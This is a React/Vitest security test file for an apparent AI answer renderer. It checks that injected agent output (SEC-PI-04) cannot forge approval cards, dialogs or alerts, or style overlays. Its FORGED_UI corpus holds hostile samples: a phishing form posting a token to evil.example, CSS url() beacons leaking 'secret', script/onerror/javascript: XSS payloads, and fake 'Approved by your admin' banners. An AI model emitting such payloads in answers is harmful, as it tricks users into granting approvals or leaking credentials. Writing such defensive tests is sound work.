import React from 'react';
import { describe, it, expect, afterEach } from 'vitest';
import { render, cleanup } from '@testing-library/react';
import { Theme } from '@radix-ui/themes';
import { AnswerContent } from '../answer-content';
import type { CitationMaps } from '../response-tabs/citations';
import { filterInlineStyle } from '@/lib/markdown/untrusted-html';

afterEach(cleanup);

const h = React.createElement;

const EMPTY_MAPS: CitationMaps = {
  citations: {},
  sources: {},
  sourcesOrder: [],
  citationsOrder: {},
};

function renderAnswer(content: string, isStreaming = false) {
  return render(
    h(Theme, null, h(AnswerContent, { content, citationMaps: EMPTY_MAPS, isStreaming })),
  );
}

/** Text an injected answer writes to pass itself off as the app's own controls. */
const FORGED_UI: Record<string, string> = {
  approvalCard: [
    '<div class="rt-Card rt-variant-surface" data-testid="tool-approval-card" role="group" aria-label="Approval needed">',
    '<strong>Approval needed</strong> Send the report to finance?',
    '<button class="rt-Button rt-variant-solid" data-testid="allow-all">Allow all</button>',
    '<button type="button" data-testid="review-each">Deny</button>',
    '</div>',
  ].join(''),
  form: [
    '<form action="https://evil.example/collect" method="post">',
    '<label>Confirm your token <input type="text" name="token" placeholder="Paste your token"></label>',
    '<textarea name="notes">notes</textarea><select name="s"><option>One</option></select>',
    '<input type="submit" value="Approve"><input type="hidden" name="x" value="y">',
    '</form>',
  ].join(''),
  alertBanner:
    '<div role="alert" aria-live="assertive" class="status-message cut-short-notice">Session expired, sign in again</div>',
  dialog:
    '<div role="dialog" aria-modal="true" class="rt-DialogContent"><p>Your admin approved this run</p></div><dialog open>Native dialog body</dialog>',
  overlay:
    '<span style="position:fixed;inset:0;z-index:9999;background:#0a0;color:white">✅ Approved by your admin</span>',
  displacement:
    '<span style="margin-top:-200px;transform:translateY(-300px);display:block;opacity:0;pointer-events:none;top:0;left:0">moved</span>',
  stickyTop:
    '<span style="position: sticky ; top : 0 ; z-index: 50 ; color: red">sticky banner</span>',
  backgroundFetch:
    '<span style="background:url(https://evil.example/p.png?d=secret);background-image:url(//evil.example/x)">bg</span>',
  styleEscape: '<span style="color: re\\64; pos\\ition: fixed; color: expression(alert(1))">escaped</span>',
  appClasses:
    '<div class="material-icons-outlined no-scrollbar rt-Button rt-variant-solid approval-card">check_circle</div>',
  fakeApprovedText: '> ✅ **Approved** by your workspace admin. No further action needed.',
  fakeCitations: 'This is backed by the policy [99] and the audit [[42]].',
  scriptsAndFrames: [
    '<a href="javascript:alert(1)">open</a>',
    '<img src="x" onerror="alert(1)">',
    '<iframe src="https://evil.example"></iframe>',
    '<style>body { display: none }</style>',
    '<script>alert(1)</script>',
  ].join(''),
};

const CORPUS = Object.values(FORGED_UI).join('\n\n');

const APPROVAL_TEST_IDS = [
  'tool-approval-card',
  'approval-group',
  'allow-all',
  'review-each',
  'interaction-heading',
  'approval-why',
  'approval-preview',
];

const FORGED_CLASSES = [
  'rt-Card',
  'rt-Button',
  'rt-variant-solid',
  'rt-DialogContent',
  'status-message',
  'cut-short-notice',
  'approval-card',
  'material-icons-outlined',
  'no-scrollbar',
];

function expectNoForgedUi(container: HTMLElement) {
  expect(container.querySelectorAll('button, form, input, select, textarea, label, iframe, dialog, style, script')).toHaveLength(0);

  for (const name of FORGED_CLASSES) {
    expect(container.querySelector(`.${name}`), name).toBeNull();
  }
  for (const id of APPROVAL_TEST_IDS) {
    expect(container.querySelector(`[data-testid="${id}"]`), id).toBeNull();
  }
  expect(container.querySelector('[data-testid]')).toBeNull();

  expect(container.querySelector('[role="alert"], [role="dialog"], [role="alertdialog"], [role="group"], [role="region"], [role="status"]')).toBeNull();
  expect(container.querySelector('[aria-modal], [aria-live]')).toBeNull();

  for (const el of Array.from(container.querySelectorAll<HTMLElement>('[style]'))) {
    const raw = el.getAttribute('style') ?? '';
    const { style } = el;
    const layered = [style.position, style.zIndex, style.inset, style.top, style.left, style.transform, style.opacity, style.pointerEvents];
    expect(layered.filter(Boolean), raw).toEqual([]);
    expect(raw).not.toMatch(/url\(|expression|margin[a-z-]*:\s*-/i);
  }

  for (const a of Array.from(container.querySelectorAll('a'))) {
    expect(a.getAttribute('href') ?? '').not.toMatch(/^javascript:/i);
  }
}

describe('SEC-PI-04: agent text cannot look like system or approval UI', () => {
  it.each([false, true])('SEC-PI-04: the forged-UI corpus renders inert (streaming=%s)', (isStreaming) => {
    const { container } = renderAnswer(CORPUS, isStreaming);
    expectNoForgedUi(container);
  });

  it.each(Object.entries(FORGED_UI))('SEC-PI-04: %s payload is neutralised on its own', (_name, payload) => {
    const { container } = renderAnswer(payload);
    expectNoForgedUi(container);
  });

  it('SEC-PI-04: forged text stays visible as plain answer text inside the answer container', () => {
    const { container, baseElement } = renderAnswer(CORPUS);

    expect(container.textContent).toContain('Approved by your admin');
    expect(container.textContent).toContain('Allow all');
    expect(container.textContent).toContain('Session expired, sign in again');
    // Nothing escapes into a portal next to the answer.
    expect(baseElement.childElementCount).toBe(1);
    expect(baseElement.textContent).toBe(container.textContent);
  });

  it('SEC-PI-04: unresolved citation markers are plain numbers that link nowhere', () => {
    const { container } = renderAnswer(FORGED_UI.fakeCitations);

    expect(container.textContent).toContain('99');
    expect(container.textContent).toContain('42');
    expect(container.querySelector('a, button, [role="button"]')).toBeNull();
  });

  it("SEC-PI-04: a code block's own copy and download buttons are the only buttons", () => {
    const { container } = renderAnswer(`${CORPUS}\n\n\`\`\`python\nprint("hi")\n\`\`\``);

    const labels = Array.from(container.querySelectorAll('button')).map((b) => b.textContent?.trim());
    expect(labels).toEqual([expect.stringContaining('Download'), expect.stringContaining('Copy')]);
    expect(container.querySelectorAll('form, input, [data-testid]')).toHaveLength(0);
  });

  it('SEC-PI-04: the markdown pipeline keeps its own classes (callouts, task lists, code language, math)', () => {
    const { container } = renderAnswer(
      [
        '> [!WARNING]\n> Check the totals.',
        '- [x] done\n- [ ] todo',
        '```rust\nx\n```',
        '$$E = mc^2$$',
        'A <span style="color: var(--red-11); font-weight: bold; position: absolute">red note</span>.',
      ].join('\n\n'),
    );

    expect(container.textContent).toContain('Warning');
    expect(container.querySelectorAll('[role="checkbox"]')).toHaveLength(2);
    expect(container.textContent).toContain('rust');
    expect(container.querySelector('.katex')).not.toBeNull();

    const note = Array.from(container.querySelectorAll('span')).find((s) => s.textContent === 'red note');
    expect(note?.style.color).toBe('var(--red-11)');
    expect(note?.style.fontWeight).toBe('bold');
    expect(note?.style.position).toBe('');
  });
});

describe('SEC-PI-04: inline style filter', () => {
  it('SEC-PI-04: keeps text colour and emphasis', () => {
    expect(filterInlineStyle('color:#c00; background-color: rgba(255, 0, 0, .1); font-style: italic')).toBe(
      'color: #c00; background-color: rgba(255, 0, 0, .1); font-style: italic',
    );
  });

  it.each([
    'position: fixed',
    'inset: 0',
    'top: 0',
    'z-index: 9999',
    'transform: translate(0, -100px)',
    'margin-top: -40px',
    'opacity: 0',
    'pointer-events: none',
    'display: none',
    'padding: 4px 12px',
    'border-radius: 999px',
    'background: url(https://evil.example/p.png)',
    'color: url(https://evil.example/p.png)',
    'color: expression(alert(1))',
    'color: re\\64',
    'color: transparent',
    'font-family: "x"',
  ])('SEC-PI-04: drops %s', (declaration) => {
    expect(filterInlineStyle(declaration)).toBe('');
  });

  it('SEC-PI-04: strips !important rather than letting it override app styles', () => {
    expect(filterInlineStyle('color: red !important')).toBe('color: red');
  });
});
